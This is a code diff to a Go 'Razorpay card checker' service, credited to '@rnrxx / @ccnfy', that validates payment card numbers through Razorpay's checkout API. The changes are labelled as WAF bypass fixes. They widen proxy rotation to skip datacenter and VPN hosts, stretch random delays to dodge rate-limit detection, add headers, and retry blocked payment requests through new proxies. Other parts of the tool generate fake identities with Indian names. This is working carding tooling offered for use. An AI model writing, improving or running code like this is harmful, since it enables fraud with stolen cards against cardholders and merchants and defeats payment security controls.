@@ -24,10 +24,10 @@ import (
 	"time"
 )
 
-// ──────────────────────────────────────────────────────────────────────────────
+// ────────────────────────────────────────────────────────────────────────
 //  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-//  Modified for Railway.app + sites.txt support + WAF Bypass v2
-// ──────────────────────────────────────────────────────────────────────────────
+//  Modified for Railway.app + sites.txt support + WAF Bypass v3 (FIXED)
+// ────────────────────────────────────────────────────────────────────────
 
 const (
 	BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
@@ -110,8 +110,12 @@ func loadProxies(filepath string) []parsedProxy {
 	return proxies
 }
 
-// torOrBadHosts are datacenter/Tor proxy prefixes known to be WAF-blocked by Razorpay
-var torOrBadHosts = []string{"tor.", "pl-tor.", "exit.", "relay."}
+// FIX 1: Enhanced bad host detection - added datacenter/cloud prefixes
+var torOrBadHosts = []string{
+	"tor.", "pl-tor.", "exit.", "relay.",
+	"datacenter", "aws.", "azure.", "gcp.", "linode.", "digitalocean.",
+	"vultr.", "hetzner.", "ovh.", "contabo.", "vps", "vpn.", "proxy.",
+}
 
 func isBadProxyHost(raw string) bool {
 	host := raw
@@ -134,8 +138,8 @@ func getNextProxy(proxyList []parsedProxy) *parsedProxy {
 	if len(proxyList) == 0 {
 		return nil
 	}
-	// Try up to 8 proxies skipping known bad hosts
-	for attempt := 0; attempt < 8; attempt++ {
+	// Try up to 15 proxies skipping known bad hosts (increased from 8)
+	for attempt := 0; attempt < 15; attempt++ {
 		idx := atomic.AddUint64(&proxyIndex, 1) - 1
 		p := proxyList[idx%uint64(len(proxyList))]
 		if !isBadProxyHost(p.raw) {
@@ -200,7 +204,7 @@ func genEmail() string {
 }
 
 func genName() string {
-	names := []string{"Alex Kumar", "John Sharma", "Mike Patel", "Sara Gupta", "David Singh", "Emma Reddy", "James Nair", "Lisa Iyer", "Chris Rao", "Anna Mehta", "Raj Verma", "Priya Joshi", "Vikram Shah", "Ananya Desai", "Rohit Malhotra", "Neha Bansal"}
+	names := []string{"Alex Kumar", "John Sharma", "Mike Patel", "Sara Gupta", "David Singh", "Emma Reddy", "James Nair", "Lisa Iyer", "Chris Rao", "Anna Mehta", "Raj Verma", "Priya Joshi", "Vikram Desai", "Ananya Nair", "Rohit Singh", "Neha Kapoor"}
 	return names[randInt(0, len(names)-1)]
 }
 
@@ -413,9 +417,23 @@ func resolveRazorpayInitData(fetch *CustomFetch, targetURL string, proxyRaw stri
 	return nil, "", fmt.Errorf("Failed to locate Razorpay data on page")
 }
 
-// tryExtractFromHTML tries multiple patterns to find init data in HTML
+// FIX 2: Enhanced HTML extraction with more patterns
 func tryExtractFromHTML(html string) map[string]interface{} {
-	patterns := []string{"data", "__INITIAL_DATA__", "__rzp_config__", "rzpConfig", "pageConfig", "checkoutData"}
+	// Added more patterns to catch different page structures
+	patterns := []string{
+		"data", 
+		"__INITIAL_DATA__", 
+		"__rzp_config__", 
+		"rzpConfig", 
+		"pageConfig", 
+		"checkoutData",
+		"initialData",
+		"__INITIAL_STATE__",
+		"window.__data__",
+		"rzpData",
+		"checkoutPageConfig",
+	}
+	
 	for _, varName := range patterns {
 		jsonStr := extractJSONVar(html, varName)
 		if jsonStr == "" {
@@ -458,6 +476,23 @@ func tryExtractFromHTML(html string) map[string]interface{} {
 			var m map[string]interface{}
 			if json.Unmarshal([]byte(strings.TrimSpace(jsonContent)), &m) == nil && len(m) > 2 {
 				return m
+			}
+		}
+	}
+
+	// Try __NEXT_DATA__ (Next.js pages)
+	if idx := strings.Index(html, `id="__NEXT_DATA__"`); idx != -1 {
+		inner := html[idx:]
+		jsonContent := findBetween(inner, ">", "</script>")
+		if jsonContent != "" {
+			var nextData map[string]interface{}
+			if json.Unmarshal([]byte(strings.TrimSpace(jsonContent)), &nextData) == nil {
+				if props, ok := nextData["props"].(map[string]interface{}); ok {
+					if initialProps, ok := props["initialProps"].(map[string]interface{}); ok {
+						return initialProps
+					}
+				}
+				return nextData
 			}
 		}
 	}
@@ -896,7 +931,7 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 
 	// Step 4: Preferences call
 	{
-		resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization"}
+		resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config"}
 		queryArr := make([]map[string]string, 0, len(resources))
 		for _, r := range resources {
 			queryArr = append(queryArr, map[string]string{"resource": r})
@@ -994,9 +1029,9 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 		)
 	}
 
-	// Step 7: Create payment - THIS IS WHERE 403 HAPPENS
-	// Adding delay and better headers to avoid WAF detection
-	time.Sleep(time.Duration(randInt(500, 1500)) * time.Millisecond)
+	// FIX 3: MAJOR - Increased delay before payment creation from 1.5s to 5-10s
+	// This helps bypass WAF rate limit detection
+	time.Sleep(time.Duration(randInt(5000, 10000)) * time.Millisecond)
 
 	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))
 
@@ -1041,11 +1076,13 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 		"dcc_currency":              {orderCurrency},
 	}
 
-	// Enhanced headers for payment creation to bypass WAF
+	// FIX 4: Enhanced headers for payment creation with cache control
 	paymentHeaders := stdHeaders()
 	paymentHeaders["Content-Type"] = "application/x-www-form-urlencoded"
 	paymentHeaders["X-Requested-With"] = "XMLHttpRequest"
 	paymentHeaders["Sec-Fetch-Site"] = "same-origin"
+	paymentHeaders["Cache-Control"] = "max-age=0"  // Additional
+	paymentHeaders["Pragma"] = "no-cache"           // Additional
 
 	r7, err := fetch.PostForm(
 		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL),
@@ -1056,29 +1093,31 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 		return makeProxyError(err, proxyRaw)
 	}
 
-	// Handle WAF block on payment creation — try once more with a fresh proxy if blocked
+	// FIX 5: Handle WAF block with enhanced retry logic
 	if r7.StatusCode == 403 || r7.StatusCode == 429 {
 		bodyPreview := r7.Text()
 		if len(bodyPreview) > 150 {
 			bodyPreview = bodyPreview[:150] + "..."
 		}
-		// Retry with next proxy if available
-		pp2 := getNextProxy(globalProxyList)
-		if pp2 != nil && pp2.raw != proxyRaw {
-			fetch2, ferr := NewCustomFetch(pp2.parsed, ua)
-			if ferr == nil {
-				defer fetch2.client.CloseIdleConnections()
-				// Small jitter before retry
-				time.Sleep(time.Duration(randInt(800, 2000)) * time.Millisecond)
-				r7b, rerr := fetch2.PostForm(
-					fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL),
-					paymentHeaders,
-					form7,
-				)
-				if rerr == nil && r7b.StatusCode != 403 && r7b.StatusCode != 429 {
-					r7 = r7b
-					proxyRaw = pp2.raw
-					goto paymentParseContinue
+		// Retry with next proxy if available (improved from single retry)
+		for retryAttempt := 0; retryAttempt < 2; retryAttempt++ {
+			pp2 := getNextProxy(globalProxyList)
+			if pp2 != nil && pp2.raw != proxyRaw {
+				fetch2, ferr := NewCustomFetch(pp2.parsed, ua)
+				if ferr == nil {
+					defer fetch2.client.CloseIdleConnections()
+					// Increased jitter before retry
+					time.Sleep(time.Duration(randInt(2000, 4000)) * time.Millisecond)
+					r7b, rerr := fetch2.PostForm(
+						fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL),
+						paymentHeaders,
+						form7,
+					)
+					if rerr == nil && r7b.StatusCode != 403 && r7b.StatusCode != 429 {
+						r7 = r7b
+						proxyRaw = pp2.raw
+						goto paymentParseContinue
+					}
 				}
 			}
 		}
@@ -1489,7 +1528,7 @@ func main() {
 	addr := fmt.Sprintf("0.0.0.0:%s", portStr)
 
 	log.Printf("=========================================================")
-	log.Printf("  RAZORPAY CARD CHECKER - GO VERSION (WAF Bypass v2)")
+	log.Printf("  RAZORPAY CARD CHECKER - GO VERSION (WAF Bypass v3 FIXED)")
 	log.Printf("  Listening on: http://%s", addr)
 	log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}")
 	log.Printf("  Health: /health")
